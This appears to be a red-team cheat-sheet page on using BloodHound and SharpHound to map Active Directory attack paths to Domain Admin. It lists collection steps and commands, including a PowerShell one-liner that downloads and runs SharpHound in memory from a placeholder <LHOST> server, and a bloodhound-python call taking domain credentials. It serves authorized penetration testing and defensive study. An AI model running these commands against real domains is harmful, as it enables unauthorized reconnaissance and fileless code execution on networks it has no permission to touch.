# 10.03 BloodHound SharpHound

> T1087.002 · Domain Account

## Overview

SharpHound walks AD via LDAP + SMB + GPO + sessions and emits JSON ingested by the BloodHound UI. The graph reveals shortest path to Domain Admin via ACLs, sessions, RDP rights, Kerberos delegation.

## Steps

- **Run collector** — SharpHound.exe (C#) or AzureHound for Entra ID.
- **Pick collection method** — All / DCOnly / Session / LoggedOn.
- **Import JSON into BloodHound** — community edition or Specterops CE.
- **Query for shortest path** — 'Shortest path from owned to DA'.

## Commands

### SharpHound (in-domain)

```powershell
# Compile from https://github.com/SpecterOps/SharpHound
SharpHound.exe -c All,LoggedOn --zipfilename bh.zip
# In-memory
IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All
```

### BloodHound.py (Linux, no-domain-join)

```bash
bloodhound-python -d <DOMAIN> -u <USER> -p <PASS> -ns <DC-IP> -c all
```
